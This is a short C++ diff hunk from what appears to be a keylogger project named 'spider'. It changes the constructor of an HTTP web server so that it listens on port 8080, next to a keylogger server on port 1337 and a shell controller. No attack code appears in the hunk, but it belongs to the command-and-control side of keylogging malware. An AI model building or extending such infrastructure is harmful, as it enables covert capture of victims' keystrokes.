@@ -40,7 +40,7 @@ int main()
   spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
 
   // Create controllers here
-  spider::http::WebServer httpServer(cmdCenter, running);
+  spider::http::WebServer httpServer(cmdCenter, running, 8080);
   spider::shell::Shell shellControl(cmdCenter, running);
 
   // Add controllers to keylogger server
